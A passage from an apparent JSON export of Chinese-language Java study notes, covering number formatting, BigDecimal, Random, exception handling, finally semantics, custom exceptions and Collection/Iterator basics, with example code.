\n  \n        //记录一个方法执行的时长  \n        long begin=System.currentTimeMillis();//开始时间  \n        shushu();//方法开始  \n        long end=System.currentTimeMillis();//记录结束时间  \n        System.out.println(\"数数花费的时间是\"+(end-begin)+\"毫秒\");  \n  \n    }  \n  \n    public static void shushu(){  \n        for (int i = 0; i \u003c1000 ; i++) {  \n            System.out.print(i+\" \");  \n        }  \n        System.out.println();  \n    }  \n}\n```\nouput\n\n![[../../../../assets/Pasted image 20220723172440.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2131_%E5%85%B3%E4%BA%8E%E6%95%B0%E5%AD%97%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96":{"title":"2131_关于数字的格式化","content":"# 2131_关于数字的格式化\n# java.text.DecimalFormat\n作用\n\t对数字进行格式化,添加千分位,补位等等\n包:https://www.matools.com/file/manual/jdk_api_1.8_google/java/text/DecimalFormat.html\neg:\n```java\nimport java.text.DecimalFormat;  \n  \npublic class DecimalFormatTest01 {  \n    public static void main(String[] args) {  \n        //java.text.DecimalFormat 是专门用于对数字进行格式化  \n        /*  \n        # 任意数字  \n        . 小数点  \n        0 不够时补位0  \n        * */        DecimalFormat d1=new DecimalFormat(\"###,###.##\");//千分位,两位小数  \n        String s1=d1.format(45456456.1212);  \n        System.out.println(s1);  \n  \n        d1=new DecimalFormat(\"####,####.000\");  \n        System.out.println(d1.format(121212.12));  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220724200600.png]]\n\n# 处理大数Big\n包类: java.math.BigDecima\n帮助文档: https://www.matools.com/file/manual/jdk_api_1.8_google/java/math/BigDecimal.html\n\n\u003e[!tip]+ 面试题 财务方面的数据的用什么类型\n\u003e**BigDecima类型**,属于大数据,**精度极高**,属于java对象,引用数据类型\n\u003e**不能直接使用+-\\**\\/ **  去进行运算,需要调用方法\neg\n```java\nimport java.math.BigDecimal;  \n  \npublic class BigDecimalTest01 {  \n    public static void main(String[] args) {  \n        //都是精度极高的数字,不是普通的123 456  \n        BigDecimal b1=new BigDecimal(123);  \n        BigDecimal b2=new BigDecimal(456);  \n    //    进行计算，不能直接加减乘除  \n        BigDecimal sum=b1.add(b2);  \n        System.out.println(sum);  \n  \n        BigDecimal div1=b2.divide(b1,2,2);  \n        System.out.println(div1);  \n  \n        BigDecimal mul=b1.multiply(b2);  \n        System.out.println(mul);  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220724205157.png|200]]\n\n\n# 随机数 Random\n包类: java.util.Random\n帮助文档: https://www.matools.com/file/manual/jdk_api_1.8_google/java/util/Random.html\n作用:产生随机数\n\neg\n```java\nimport jdk.management.resource.internal.inst.SocketOutputStreamRMHooks;  \n  \nimport java.util.Random;  \n  \npublic class RandomTest01 {  \n    public static void main(String[] args) {  \n        //创建随机数对象  \n        Random r1=new Random();  \n        int i1=r1.nextInt();//创建一个随机数  \n        System.out.println(i1);  \n        i1=r1.nextInt(100);//产生一个小于括号里面数的随机数,不包括括号里面的这个数  \n        System.out.println(i1);  \n    }  \n}\n```\n\nouput\n![[../../../../assets/Pasted image 20220724210115.png]]\n\neg2:输出五个不重复的随机数\n```java\nimport java.util.Arrays;  \nimport java.util.Random;  \n  \npublic class RandomTest02 {  \n    public static void main(String[] args) {  \n    //    创建一个随机数对象  \n        Random r=new Random();  \n    //    创建一个五个元素的数组  \n        int[] arr=new int[5];  \n        int index;//随机数变量,最新插入随机数的下标  \n        index=0;  \n    //    对五个元素进行初始化  \n        //因为随机数是从0开始的,之后比较是否有重复元素的时候有所影响,所以全部默认值设置为不在范围内的数  \n        Arrays.fill(arr, 101);  \n  \n        while (index\u003carr.length){  \n            int rom=r.nextInt(101);  \n            Arrays.sort(arr);//对数组进行排序  \n            if (Arrays.binarySearch(arr, rom)==-1) {  \n                arr[index++]=rom;  \n            }  \n        }  \n  \n        //输出随机数数组  \n        for (int i = 0; i \u003c arr.length; i++) {  \n            System.out.print(arr[i]+\" \");  \n        }  \n    }  \n  \n  \n}\n```\n\nouput\n![[../../../../assets/Pasted image 20220724214951.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/221_%E5%BC%82%E5%B8%B8":{"title":"221_异常","content":"# 221_异常\n帮助文档:https://www.matools.com/file/manual/jdk_api_1.8_google/java/lang/Exception.html\n\n# 概述\n1. 异常是一种类,[[#eg2 new异常对象|可以new对象]]\n2. 通过处理异常,增加程序的健壮性\n\n---\n\n## eg1\n```java\npublic class Test01 {  \n    public static void main(String[] args) {  \n        int c=10/0;  \n        /*  \n        代码执行到此处,会出现异常,然后 就会new一个异常对象:Exception in thread \"main\" java.lang.ArithmeticException: / by zero  \n   at Test01.main(Test01.java:3)   JVM会将异常信息输出,打印到控制台  \n        * */    }  \n}\n```\nouput\n![[../../../../assets/Pasted image 20220725103128.png]]\n\n## eg2 new异常对象\n```java\npublic class Test02 {  \n    public static void main(String[] args) {  \n        NumberFormatException nfx=new NumberFormatException(\"数字格式化异常\");  \n        System.out.println(nfx);  \n    }  \n\t}\n```\nouput\n![[../../../../assets/Pasted image 20220725103506.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/222_UML_%E7%BB%9F%E4%B8%80%E5%BB%BA%E6%A8%A1%E8%AF%AD%E8%A8%80":{"title":"222_UML_统一建模语言","content":"# 222_UML_统一建模语言\n# 语法来源\n使用Mermaid创建类图 帮助文档:http://soft.xiaoshujiang.com/docs/grammar/feature/mermaid/#e7b1bbe59bbe_36\n**建议**博客版本:https://www.cnblogs.com/mybdss/p/14958781.html\n\n[[使用Mermaid语法画UML类图]]\n\n","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/223_%E5%BC%82%E5%B8%B8%E7%9A%84%E7%BB%A7%E6%89%BF%E7%BB%93%E6%9E%84":{"title":"223_异常的继承结构","content":"# 223_异常的继承结构\n# 总结\n1. **编译阶段异常是不会出现的,**编译时异常和运行时异常都是发生在**运行阶段**\n\t1. 因为异常需要new对象,只有程序运行才会new对象\n\t2. 编译时异常是因为必须在编写代码阶段预先处理,不然编译器就会报错而得名\n2. `Object`下有`Throwable`(可抛出)\n3. `Throwable`下有两个分支:\n\t1. `Error`:错误,**不可以处理,终止程序执行,直接退出JVM**\n\t2. `Exception`:异常,**可以处理**\n4. 尽量避免Error,在Exception时就对其进行处理\n5. 编译时异常发生概率相对较高\n\n# 继承结构图\n```mermaid\nclassDiagram\n\tObject\u003c|--Throwable\n\tThrowable:不管是错误还是异常,都是可以抛出的\n\tThrowable\u003c|--Error\n\tError:所有的错误只要发生,java程序都会终止执行,退出JVM\n\t\tError\u003c|--IOError\n\t\tError\u003c|--VirtualMachineError\n\tThrowable\u003c|--Exception\n\t\tException\u003c|--ExceptionSubClass:编译时异常\n\t\tExceptionSubClass:不是编译时发生的\n\t\tExceptionSubClass:编写程序的时候事先对其进行异常处理\n\t\tExceptionSubClass:如果不处理,编译器就会报错\n\t\tException\u003c|--RuntimeException:运行时异常\n\t\tRuntimeException:运行时异常,\n\t\tRuntimeException:你可以处理,也可以不处理\n\t\t\tRuntimeException\u003c|--NullPointerException\n\t\t\tRuntimeException\u003c|--ClassCastException\n\t\t\tRuntimeException\u003c|--IllegalArgumentException\n\t\t\t\tIllegalArgumentException\u003c|--NumberFormatException\n%% 写起来还是挺简单的\n```\n","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/224_%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E5%8E%9F%E7%90%86":{"title":"224_异常处理的原理","content":"# 224_异常处理的原理\n\u003e[!tip]+ 强调\n\u003e 所有异常都是发生在**运行阶段**.\n\n# 异常处理方法\njava对异常的处理有两种方式: **上抛(上报)**和**捕获**\n\u003e[!tip]+ 异常的两种处理方式\n\u003e1. 在方法声明的位置上,使用`throws`关键字,**抛给上一级**,谁调用我,就抛给谁 \n   [[#eg1 第一种异常处理 添加throws关键字]]\n\u003e2. 使用`try{}  catch{}`语句进行**异常捕获**,异常发生了,谁都不知道,但是我抓住了.    相关:\n\u003e\t1. [[#第二种异常处理 使用try catch捕获异常]]  \n\u003e\t2. [[225.异常对象的常用方法#^2efa19]]\n\u003e\t语法格式 **catch后面可以写确定的异常类型,也可以写父类异常(异常的爹)**\n```java\n\ttry {  \n\t\tdoSome();  \n\t}catch (ClassNotFoundException e){  \n\t\te.printStackTrace();  \n\t}\n```\n## 关键字\n\u003e[!tip]+ throw throws\n\u003ethrows **声明方法的时候使用**，将异常情况上报给调用者\n\u003ethrow 手动抛出异常 `throw new 异常()；`\n\n## eg1:第一种异常处理:添加throws关键字\n```java\npublic class Test03 {  \n//使用 throws关键字 继续上抛异常,上抛给调用者 main方法 ,类似于推卸责任\n    public static void main(String[] args) throws ClassNotFoundException{  \n        doSome();  \n  \n    }  \n    public static void doSome() throws ClassNotFoundException{  \n        System.out.println(\"doSome~~\");  \n    }  \n}\n```\nouput\n\u003e在方法上继续使用throws,完成异常上抛,将异常抛给调用者`main`\n![[../../../../assets/Pasted image 20220726095200.png]]\n\n## 第二种异常处理:使用try catch捕获异常\n```java\npublic class Test03 {  \n\n    public static void main(String[] args) {  \n    //直接捕获异常,解决异常,调用者不知道\n        try {  \n            doSome();  \n        }catch (ClassNotFoundException e){  \n            e.printStackTrace();  \n        }  \n    }  \n    public static void doSome() throws ClassNotFoundException{  \n        System.out.println(\"doSome~~\");  \n    }  \n}\n```\nouput\n![[../../../../assets/Pasted image 20220726100156.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/225_%E5%BC%82%E5%B8%B8%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95":{"title":"225_异常对象的常用方法","content":"# 225_异常对象的常用方法\n```java\n//获取异常的描述信息\nString msg=excepiton.getMessage();\n//打印异常的堆栈信息\nexception.printStackTrace();\n```\n\n**使用`printStackTrace`不会让程序停止,只是输出堆栈异常信息,程序很健壮**\n\n## eg1\n```java\npublic class Test05 {  \n    public static void main(String[] args) {  \n        NullPointerException e=new NullPointerException(\"空指针异常~\");  \n        String msg=e.getMessage();  \n        System.out.println(msg);  \n    }  \n}\n```\n这里的异常是一个对象,没有作为异常**抛出**,所以执行的时候不会报错\n即,异常需要抛出,才会报错\nouput\n![[../../../../assets/Pasted image 20220726112134.png]]\n\n```java\ne.printStackTrace();  \nSystem.out.println(\"helloWorld\");\n```\nouput\n![[../../../../assets/Pasted image 20220726112207.png]]\n`printStackTrace`采用了**异步线程**,所以打印的顺序不对\n\n## eg2\n```java\nimport java.io.FileInputStream;  \nimport java.io.FileNotFoundException;  \nimport java.io.IOException;  \n  \npublic class Test06 {  \n    public static void main(String[] args) throws IOException {  \n        FileInputStream fis=null;//声明输入流对象  \n        try {  \n        //    创建输入流对象  \n            fis=new FileInputStream(\"C:\\\\Users\\\\22305\\\\Desktop\\\\01读书笔记模板.md\");  \n            String s=null;  \n            s.toString();//空指针异常  \n            System.out.println(\"hellword\");  \n            //fis.close();//由于上面异常,所以可能会出现无法关闭输入流,需要finally  \n        } catch (FileNotFoundException e) {  \n            System.out.println(\"文件没找到\");  \n            e.printStackTrace();//捕获堆栈异常  \n        }catch (NullPointerException e){  \n            System.out.println(\"空指针异常\");  \n            e.printStackTrace();  \n        }finally {  \n            fis.close();  \n            System.out.println(\"关闭输入流\");  \n        }  \n  \n        System.out.println(\"执行完毕\");  \n  \n    }  \n}\n```\nouput\n![[../../../../assets/Pasted image 20220726121947.png]]\n\n可以通过这个了解对捕获异常的堆栈打印,在printStackTrace是非常有必要的,不然不知道哪里发生了异常,哪里需要处理(一本正经胡说八道)\n`finall`语句的正确使用,无论异常是否发生,最后的`finally`语句块都会执行,通常用于**释放资源** ^2efa19","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/226_finally%E8%AF%AD%E5%8F%A5":{"title":"226_finally语句","content":"# 226_finally语句\n1. finally语句通常用于**释放资源**,这非常有必要.\n2. `finally`中的语句是一定会执行的,除非你退出JVM`System.exe(0);`\n3. finally可以不要catch,只要`try finally`\n4. **即使try里面有`return`,`finally`中的语句依然会执行**\n5. try不能单独使用\n![[225.异常对象的常用方法#eg2]]\n\n## eg第三点\n```java\npublic class Test07 {  \n    public static void main(String[] args) {  \n        try {  \n            System.out.println(\"这是try\");  \n            return;  \n        } finally {  \n            System.out.println(\"这是finally\");  \n        }  \n    }  \n}\n```\nouput\n![[../../../../assets/Pasted image 20220726122752.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/227_finally%E9%9D%A2%E8%AF%95%E9%A2%98":{"title":"227_finally面试题","content":"# 227_finally面试题\n```java\npackage com.bjpowernode.javase.exception;\n/*\nfinally面试题\n */\npublic class ExceptionTest13 {\n    public static void main(String[] args) {\n        int result = m();\n        System.out.println(result); //100\n    }\n\n    /*\n    java语法规则（有一些规则是不能破坏的，一旦这么说了，就必须这么做！）：\n        java中有一条这样的规则：\n            方法体中的代码必须遵循自上而下顺序依次逐行执行（亘古不变的语法！）\n        java中海油一条语法规则：\n            return语句一旦执行，整个方法必须结束（亘古不变的语法！）\n     */\n    public static int m(){\n        int i = 100;\n        try {\n            // 这行代码出现在int i = 100;的下面，所以最终结果必须是返回100\n            // return语句还必须保证是最后执行的。一旦执行，整个方法结束。\n            return i;\n        } finally {\n            i++;\n        }\n    }\n}\n\n/*\n反编译之后的效果\npublic static int m(){\n    int i = 100;\n    int j = i;\n    i++;\n    return j;\n}\n */\n\n```\noutput\n```cmd\n100\n```\n\n**输出很奇葩**,看反编译的代码","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/228_finalfinallyfinalize%E7%9A%84%E5%8C%BA%E5%88%AB":{"title":"228_final,finally,finalize()的区别","content":"# 228_final,finally,finalize()的区别\n\u003e[!faq]+ final,finally,finalize()的区别\n\u003e1. `final`,`finally`是一个**关键字**,\n\u003e2. `final`用于修饰变量,类等等,表示最终的不可变的\n\u003e3. `finally`是用于异常处理try catch,无论异常是否发生,`finally`中的语句都会发生\n\u003e4. `finalize`是`Object`中的一个**方法**,是一个**标识符**,不是关键字,由JVM的GC垃圾回收器负责调用","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2291_%E5%BC%82%E5%B8%B8%E5%AE%9E%E9%99%85%E4%BE%8B%E5%AD%90":{"title":"2291_异常实际例子","content":"# 2291_异常实际例子\n# 总结\n\u003e[!tip]+ 书写方法注意点\n\u003e1. 首先异常类\n\u003e\t1. 继承RuntimeException或者Exception\n\u003e\t2. 两个方法，一个无参，一个String\n\u003e2. 其次写栈类：主要用来new对象，以及对异常的抛出\n\u003e\t1. 在**方法**中**throws**抛出异常\n\u003e\t2. 判断if什么情况需要抛出异常`throw new StatckOperationException(\"异常信息\");  `\n\u003e3. 最后测试类\n\u003e\t1. 注意try对象的判断，异常情况抛出的e的**堆栈信息**、**异常信息描述**是否需要打印\n\u003e\t2. [[225.异常对象的常用方法]]\n\n\n# eg1 栈操作\n栈操作异常类\n```java\n//栈操作异常  \npublic class StatckOperationException extends RuntimeException{  \n    public StatckOperationException() {  \n  \n    }  \n  \n    public StatckOperationException(String message) {  \n        super(message);  \n    }  \n}\n```\n栈类\n```java\npublic class MyStack {  \n    private Object[] eles;  \n    private int index;//栈顶帧  \n    //压栈方法  \n    //继承栈操作异常  \n    public void push(Object obj) throws StatckOperationException{  \n        //当栈溢出的时候，抛出栈溢出的异常  \n        if (index\u003e=eles.length-1){  \n            throw new StatckOperationException(\"栈溢出\");  \n        }  \n        index++;  \n        eles[index]=obj;  \n        System.out.println(\"push success\"+obj+\" frame：\"+index);  \n    }  \n  \n    //弹栈方法  \n    public void pop() throws StatckOperationException{  \n        if (index\u003c0){  \n            throw new StatckOperationException(\"弹栈失败\");  \n        }  \n        System.out.println(\"pop\"+eles[index]);  \n        index--;  \n        System.out.println(\"stack iframe to: \"+index);  \n    }  \n  \n    //封装  \n  \n    public MyStack() {  \n        this.eles=new Object[10];//初始化站容量  \n        this.index=-1;//栈帧在底部  \n    }  \n  \n    public MyStack(Object[] eles, int index) {  \n        this.eles = eles;  \n        this.index = index;  \n    }  \n  \n    public Object[] getEles() {  \n        return eles;  \n    }  \n  \n    public void setEles(Object[] eles) {  \n        this.eles = eles;  \n    }  \n  \n    public int getIndex() {  \n        return index;  \n    }  \n  \n    public void setIndex(int index) {  \n        this.index = index;  \n    }  \n}\n```\n测试类\n```java\npublic class StackTest01 {  \n    public static void main(String[] args) {  \n        MyStack m1=new MyStack();  \n  \n        try {  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n            m1.push(new Object());  \n        }catch (StatckOperationException e){  \n            System.out.println(e.getMessage());  \n              \n        }  \n        try {  \n            m1.pop();  \n            m1.pop();  \n            m1.pop();  \n            m1.pop();  \n            m1.pop();  \n            m1.pop();  \n            m1.pop();  \n            m1.pop();  \n            m1.pop();  \n            m1.pop();  \n            m1.pop();  \n            m1.pop();  \n            m1.pop();  \n        }catch (StatckOperationException e){  \n            System.out.println(e.getMessage());  \n        }  \n    }  \n}\n```\nouput\n![[../../../../assets/Pasted image 20220726161026.png]]\n\n# eg2 用户登录\n异常类\n```java\n//非法名称异常  \npublic class illagalNameException extends RuntimeException{  \n    public illagalNameException() {  \n        super();  \n    }  \n  \n    public illagalNameException(String message) {  \n        super(message);  \n    }  \n}\n```\n服务器类\n```java\npublic class UserServers {  \n    /**  \n     *     * @param name 登录用户名  \n     * @param password 登录密码  \n     * @throws illagalNameException 判断登录用户名是否正确  \n     */  \n  \n    public void register(String name,String password) throws illagalNameException{  \n        if (null==name||name.length()\u003c4||name.length()\u003e16){  \n            throw new illagalNameException(\"用户名不合法！\");  \n        }  \n    //    以上异常没有抛出，就会执行下来  \n        System.out.println(\"欢迎 \"+ name+\" 登录~\");  \n    }  \n  \n  \n}\n```\n登录测试类\n```java\npublic class UserRegisterTest01 {  \n    public static void main(String[] args) {  \n    //    创建对象  \n        UserServers u1=new UserServers();  \n        try {  \n            u1.register(\"\",\"pass1\");  \n        }catch (illagalNameException e){  \n            System.out.println(e.getMessage());  \n            e.printStackTrace();  \n        }  \n        try {  \n            u1.register(\"caixukun\",\"pass1\");  \n        }catch (illagalNameException e){  \n            System.out.println(e.getMessage());  \n  \n        }  \n    }  \n}\n```\nouput\n![[../../../../assets/Pasted image 20220726171600.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2292_%E7%BB%A7%E6%89%BF%E7%9A%84%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96%E5%92%8C%E5%BC%82%E5%B8%B8":{"title":"2292_继承的方法覆盖和异常","content":"# 2292_继承的方法覆盖和异常\n![[../../../../assets/Pasted image 20220726163010.png]]\n总结：\n子类继承父类的时候，方法覆盖的异常不能大于父类的异常，不能比父类异常多。\n简单的描述：子类的异常只能是父类异常的**子异常或者同等异常**，要么就不写\n相关：[[../../爪哇基础/07方法覆盖和多态/01方法覆盖/071.方法覆盖override]]\n\n没有异常\u003e父类异常\u003e子类异常\n不写就是默认的父类的异常","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/229_%E5%A6%82%E4%BD%95%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%82%E5%B8%B8%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99%E5%BC%82%E5%B8%B8":{"title":"229_如何自定义异常(自己编写异常)","content":"# 229_如何自定义异常(自己编写异常)\n# 步骤\n1. 定义一个异常,继承`Exception`或者`RuntimeException`\n2. 提供两个方法,一个有参数的,一个`String`参数的\n\n## eg\n定义异常\n```java\npublic class MyException extends RuntimeException{  \n    public MyException(){  \n  \n    }  \n  \n    public MyException(String s) {  \n        super(s);  \n    }  \n}\n```","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2301_%E9%9B%86%E5%90%88list%E6%A6%82%E8%BF%B0":{"title":"2301_集合list概述","content":"# 2301_集合list概述\n\n包类: `java.util`\n# 概述\n1. 数组就是以一个集合，但是集合可以容纳不同数据类型的数据\n2. 是一个容器，可以**一次容纳多个对象**\n3. 集合**存储的是java对象的内存地址**，是**引用**，引用对象本身的内存地址。并不是对象本身。不能存储基本数据类型，也不能存储对象。![[../../../../assets/Pasted image 20220727164431.png]]\n4. 不同的集合，**底层会对应不同的数据结构**，往不同的集合中存储数据，相当于放到了不同的数据结构中\n\n---\n\n# 集合分类\nJava中集合分为两类：\n1. 单个方式存储元素，超级父接口为：`java.util.Collection`\n2. **键值对**方式存储元素，超级父接口为：`java.util.Map`","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2302%E9%9B%86%E5%90%88%E7%BB%A7%E6%89%BF%E7%BB%93%E6%9E%84%E5%9B%BE1_Collection":{"title":"2302集合继承结构图1_Collection","content":"# 2302集合继承结构图1_Collection\n\n\n```mermaid\nclassDiagram\nclass Iterable{\n\t\u003c\u003cinterface\u003e\u003e\n\t+iterator()\n所有集合元素都是可以迭代的，\n可以遍历的\n}\n\nclass Collection{\n\t\u003c\u003cinterface\u003e\u003e\n\tCollection\n}\n\t\n\t\n\tCollection--\u003eIterator:关联，has a\n\tCollection--|\u003eIterable:泛化，继承，is a\nclass Iterator{\n\u003c\u003cinterface\u003e\u003e\n\t集合的迭代器对象\n\t+hasNext()\n\t+next()\n\t+remove()\n}\n\nclass List{\n\t\u003c\u003cinterface\u003e\u003e\n\t有序可重复\n\t\n\t有下标\n}\n%%有序说的是，存进去什么顺序，取出来还是什么顺序，不是大小的排序%%\nList--|\u003eCollection:泛化\n\n\n\nclass ArrayList{\n非线程安全\n数据结构：数组\n}\nArrayList..|\u003eList:实现\n\nclass LinkedList{\n数据结构：双向链表\n}\nLinkedList..|\u003eList:实现，like a\n\nclass Vector{\n线程安全但效率低\n数据结构：集合\n}\nVector..|\u003eList\n\nclass Set{\n\t\u003c\u003cinterface\u003e\u003e\n\t无序不重复\n\t无下标\n}\nSet--|\u003eCollection:泛化\n\nclass HashSet{\n底层实际new的是一个HashMap集合\n存储在了HashMap集合中\n数据结构：哈希表\n}\nHashSet..|\u003eSet\n\nclass SortSet{\n\t\u003c\u003cinterface\u003e\u003e\n\t可排序集合\n\t放到其中的元素会自动排序\n}\nSortSet--|\u003eSet\n\nclass TreeSet{\n底层实际是new的TreeMap集合\n数据实际存储在了TreeMap中了\n数据结构：二叉树\n}\nTreeSet..|\u003eSortSet\n\n```\n\n![[../../../../assets/Pasted image 20220728190823.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2303%E9%9B%86%E5%90%88%E7%BB%A7%E6%89%BF%E7%BB%93%E6%9E%84%E5%9B%BE2_Map":{"title":"2303集合继承结构图2_Map","content":"# 2303集合继承结构图2_Map\n\n```mermaid\nclassDiagram\nclass Map{\n\u003c\u003cinterface\u003e\u003e\n}\n\nclass HashMap{\n非线程安全\n数据结构：哈希表\n}\nHashMap..|\u003eMap:实现\n\nclass Hashtable{\n线程安全效率低\n数据结构：哈希表\n}\nHashtable..|\u003eMap:实现\nclass Properties{\n属性类\n也是线程安全，继承自Hashtable\n只支持String类型\n}\nPreperties--|\u003eHashtable\n\nclass SortedMap{\n\u003c\u003cinterface\u003e\u003e\n无序不可重复\n可排序集合\n在key部分的元素会自动排序\n}\nSortedMap--|\u003eMap:继承\n\n\n```\n\n1. Map的key是无序不可重复的\n2. key和value都是存储对象的内存地址\n3. Map集合以键值对方式存储对象\n![[../../../../assets/Pasted image 20220728190807.png]]\n\n特点：\n![[../../../../assets/Pasted image 20220728191011.png]]\n![[../../../../assets/Pasted image 20220728191014.png]]\n![[../../../../assets/Pasted image 20220728191143.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2304_Collection%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95":{"title":"2304_Collection中常用的方法","content":"# 2304_Collection中常用的方法\n\n\u003e[!faq]+ `java.util.collection`中能够存放的元素\n\u003e1. 没有使用**泛型**，collection中可以存放Object中的所有子类型\n\u003e2. 使用**泛型**之后，collection中只能存放某种**具体的类型**\n\u003e3. 集合中**不能直接存储基本数据类型，也不能存储java对象**，存储的只是**java对象的内存地址\n\n\n## eg\n```java\nimport java.util.ArrayList;  \nimport java.util.Collection;  \n  \npublic class Test01 {  \n    public static void main(String[] args) {  \n    //    Collection是接口，无法实例化对象，不能new出来  \n    //    多态方式new实现子类  \n        Collection c=new ArrayList();  \n  \n    //   boolean add(Object e) 测试add方法  \n        c.add(11);//不是11，而是装箱之后的11封装类型integer  \n        c.add(new int[10]);  \n        c.add(\"djsk\");  \n  \n    //    int size(),获取集合个数  \n        System.out.println(\"集合元素个数：\"+c.size());  \n  \n    //    void clear()清空集合  \n        c.clear();  \n        System.out.println(\"清空之后：\"+c.size());  \n        c.add(\"Hello\");  \n        c.add(\"ok\");  \n        c.add(13);  \n  \n        // contains(Object o) 如果此集合包含指定的元素，则返回 true 。  \n        System.out.println(c.contains(13));  \n        System.out.println(c.contains(46));  \n  \n        // remove(Object o) 删除某个元素  \n        System.out.println(c.size());  \n        c.remove(13);  \n        c.contains(13);  \n        System.out.println(c.size());  \n  \n        //isEmpty() 判断是否为空  \n        System.out.println(c.isEmpty());  \n        c.clear();  \n        System.out.println(c.isEmpty());  \n  \n    //     toArray()转换成数组  \n        c.add(\"Hello\");  \n        c.add(\"ok\");  \n        c.add(13);  \n        c.add(new Object());  \n        Object[] o1=c.toArray();  \n        //对生成的数组进行输出  \n        for (int i = 0; i \u003co1.length ; i++) {//遍历数组  \n            System.out.println(o1[i]);  \n        }  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220728200324.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2305_Collection%E8%BF%AD%E4%BB%A3%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8Iterator":{"title":"2305_Collection迭代器的使用Iterator","content":"# 2305_Collection迭代器的使用Iterator\n\u003e[!tip]+ 迭代器遍历步骤\n\u003e1. 获取集合的迭代器对象itorator  `Iterator it=xxx.iterator();  `\n\u003e2. 进行迭代器遍历  \n\u003e\n\u003e\t```java\n\u003e\t//判断是否有下一个元素，有的话就执行输出，没有就停止循环\n\u003e\twhile (it.hasNext()){  \n\u003e \t           System.out.println(it.next());  \n \u003e \t      } \n\u003e\t```\n## eg\n```java\nimport java.util.ArrayList;  \nimport java.util.Collection;  \nimport java.util.Iterator;  \n  \npublic class Test02 {  \n    public static void main(String[] args) {  \n        //创建集合对象  \n        Collection c=new ArrayList();  \n        //添加元素  \n        c.add(12);  \n        c.add(\"添加第一个元素\");  \n        c.add(new Object());  \n  \n        //获取集合的迭代器对象itorator  \n        Iterator it=c.iterator();  \n    //    进行迭代器遍历  \n        while (it.hasNext()){  \n            System.out.println(it.next());  \n        }  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220728201705.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2306__Collection%E7%9A%84contains":{"title":"2306__Collection的contains","content":"# 2306__Collection的contains\n# 总结\ncontains底层调用的是通过`equals`方法去对内容进行比对，查看查看集合中是否包含，如果是String方法的话，因为已经被重写，所以是比较的字符内容是否包含。\n放在集合中的内容，如果要使用`contains()`或者[[23.07.remove方法|remove()]]，那么必须要**重写`equals`方法**\n源代码 ![[../../../../assets/Pasted image 20220729090025.png]]\n## eg\n\n```java\nimport java.util.ArrayList;  \nimport java.util.Collection;  \n  \npublic class Test03 {  \n    public static void main(String[] args) {  \n        //    创建集合对象  \n        Collection c = new ArrayList();  \n        //    添加元素  \n        String a = new String(\"abc\");  \n        c.add(a);  \n        String b = new String(\"abc\");  \n        c.add(b);  \n        //    contains  \n        System.out.println(c.contains(\"abc\"));  \n        System.out.println(a == b);//对比的a和b这个的地址，a和b中存储的“abc\"的内存地址  \n  \n    }  \n}\n```\nouput\n![[../../../../assets/Pasted image 20220729090138.png]]\n\n## eg2\n```java\nimport java.util.ArrayList;  \nimport java.util.Collection;  \n  \npublic class Test04 {  \n    public static void main(String[] args) {  \n        Collection c=new ArrayList();  \n        User u1=new User(\"张三\");  \n        c.add(u1);  \n        User u2=new User(\"张三\");  \n        System.out.println(c.contains(u2));  \n    }  \n}  \nclass User{  \n    private String name;  \n  \n    public User() {  \n    }  \n  \n    public User(String name) {  \n        this.name = name;  \n    }  \n  \n    @Override  \n    public boolean equals(Object obj) {  \n        if (obj==null||!(obj instanceof User)) return false;  \n        if (this==obj) return true;  \n        User u=(User)obj;//强制向下转型  \n        return this.name==u.name;  \n    }  \n}\n```\n\nouput\n![[../../../../assets/Pasted image 20220729094245.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2307_remove%E6%96%B9%E6%B3%95":{"title":"2307_remove方法","content":"# 2307_remove方法\n1. 和contains一样，底层也使用了equals方法去对比，然后删除集合中的对应元素，所以需要重写`equals`方法\n2. 在迭代器迭代的过程中，**要使用 迭代器.remove()的方法去删除元**，因为集合.remove()会改变集合结构，需要构造new迭代器，不然会出现异常","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2308_List%E7%89%B9%E6%9C%89%E7%9A%84%E6%96%B9%E6%B3%95":{"title":"2308_List特有的方法","content":"# 2308_List特有的方法\n```java\nimport com.sun.org.apache.xpath.internal.WhitespaceStrippingElementMatcher;  \nimport sun.security.util.AuthResources_it;  \n  \nimport java.util.ArrayList;  \nimport 